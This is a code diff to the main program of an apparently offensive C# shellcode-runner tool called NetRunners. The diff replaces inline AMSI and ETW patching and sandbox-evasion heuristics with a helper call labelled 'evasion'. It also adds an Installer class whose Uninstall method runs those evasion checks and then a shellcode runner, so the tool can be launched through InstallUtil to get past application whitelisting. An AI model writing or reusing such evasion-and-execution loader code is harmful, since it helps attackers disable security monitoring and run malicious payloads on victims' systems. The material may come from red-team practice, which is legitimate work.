@@ -1,8 +1,6 @@
-﻿using NetRunners.Heuristics;
+﻿using System;
 using NetRunners.Interfaces;
 using NetRunners.Runners;
-using NetRunners.Patchers;
-using System;
 
 namespace NetRunners.Exe
 {
@@ -17,10 +15,8 @@ namespace NetRunners.Exe
         /// <param name="/eps">Calls EntryPoint Stomping Runner. Case Insensitive</param>
         static void Main(string[] args)
         {
-            if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
-            {
-                return; // Exit if any checks fail or patching fails
-            }
+            // evasion
+            NetRunners.Helpers.Helper.PerformChecks();
 
             // execute runner
             IRunner runner = DetermineRunner(args);
@@ -40,8 +36,22 @@ namespace NetRunners.Exe
                     return new EntryPointStompingRunner();
                 default:
                     Console.WriteLine("Default Shellcode Runner selected!");
-                    return new DefaultRunner(); 
+                    return new DefaultRunner();
             }
+        }
+    }
+    /// <summary>
+    /// Add InstallUtil support.
+    /// </summary>
+    [System.ComponentModel.RunInstaller(true)]      // add installutil support
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            // evasion
+            NetRunners.Helpers.Helper.PerformChecks();
+            // execution
+            NetRunners.Helpers.Helper.SelectRunner();
         }
     }
 }
